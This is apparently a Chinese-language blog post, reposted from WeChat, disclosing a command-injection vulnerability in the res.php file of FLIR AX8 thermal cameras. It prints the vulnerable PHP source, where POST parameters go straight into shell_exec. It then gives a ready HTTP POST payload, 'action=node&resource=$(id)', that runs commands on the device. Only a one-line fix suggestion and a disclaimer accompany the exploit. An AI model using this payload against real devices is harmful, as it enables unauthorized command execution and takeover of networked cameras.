<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yjswlabuFelru9RQMLqvvA)

**漏洞说明**

FLIR-AX8 res.php 文件存在命令执行漏洞，攻击者可以获取服务器权限

**影响版本**

```
FLIR-AX8

```

漏洞复现  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXYCDO93HxhSwH23K2hYUUdDd5n0SCD2iacLlkEPDMZJndnicVUUiabSP3sBomUic62SVRfEXOOrbqbWA/640?wx_fmt=png)

res.php

```
<?php
  if (isset($_POST["action"])) {
    switch ($_POST["action"]) {
      case "get":
        if(isset($_POST["resource"]))
        {
          switch ($_POST["resource"]) {
            case ".rtp.hflip":
              if (!file_exists("/FLIR/system/journal.d/horizontal_flip.cfg")) {
                $result = "false";
                break;
              }
              $result = file_get_contents("/FLIR/system/journal.d/horizontal_flip.cfg") === "1" ? "true" : "false";
              break;
            case ".rtp.vflip":
              if (!file_exists("/FLIR/system/journal.d/vertical_flip.cfg")) {
                $result = "false";
                break;
              }
              $result = file_get_contents("/FLIR/system/journal.d/vertical_flip.cfg") === "1" ? "true" : "false";
              break;
            default:
              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o ".$_POST["resource"]));
          }
        }
        break;
      case "set":
        if(isset($_POST["resource"]) and isset($_POST["value"])) {
          switch ($_POST["resource"]) {
            case "rtp.hflip":
              file_put_contents("/FLIR/system/journal.d/horizontal_flip.cfg", $_POST["value"] === "true" ? "1" : "0");
              break;
            case "rtp.vflip":
              file_put_contents("/FLIR/system/journal.d/vertical_flip.cfg", $_POST["value"] === "true" ? "1" : "0");
              break;
            default:
              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rset ".$_POST["resource"]." ".$_POST["value"]));;
          }
        }
        break;
      case "measurement":
        if (isset($_POST["type"]) && isset($_POST["id"])) {
          $nodeData =  trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.measureFuncs.".$_POST["type"].".".$_POST["id"]));
          $lines = explode("\n", $nodeData);
          foreach($lines as $line)
          {
            $resource = preg_split('/\s+/', $line);
            $value = trim($resource[1], "\"");
            $result[$resource[0]] = $value;
          }
        }
        break;
      case "global-parameters":
        $nodeData =  trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.basicImgData.objectParams"));
        $lines = explode("\n", $nodeData);
        foreach($lines as $line)
        {
          $resource = preg_split('/\s+/', $line);
          $result[$resource[0]] = $resource[1];
        }
      case "alarm":
        if(isset($_POST["id"]))
        {
          $nodeData = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls .image.sysimg.alarms.measfunc.".$_POST["id"]));
          $lines = explode("\n", $nodeData);
          foreach($lines as $line)
          {
            $resource = preg_split('/\s+/', $line);
            $value = trim($resource[1], "\"");
            $result[$resource[0]] = $value;
          }
        }
        break;
      case "calibrate":
        $result = shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/nuc");
        break;
      case "node":
        $nodes = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls ".$_POST["resource"]));
        $result = preg_split("/\s+\n/", $nodes);
        break;
    }
    echo json_encode($result);
  }
?>

```

让可控参数: action 走到 node 后，使用可控参数: resource 执行命令

payload:  

```
POST /res.php HTTP/1.1
Host: ip:port
Cookie: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneDST=0; PHPSESSID=87215a3eabdc306e4bc37e58d18e4940; clientTimeZoneOffset=-480
Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Length: 28
action=node&resource=$(id)

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXYCDO93HxhSwH23K2hYUUdia4FyQrzSYDQxicmwZwdBY9eUx9MfDn9EtCLxOWtHAib5dsadXnQlnkCQ/640?wx_fmt=png)

**修复建议**

对可控参数 resource 进行过滤校验

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路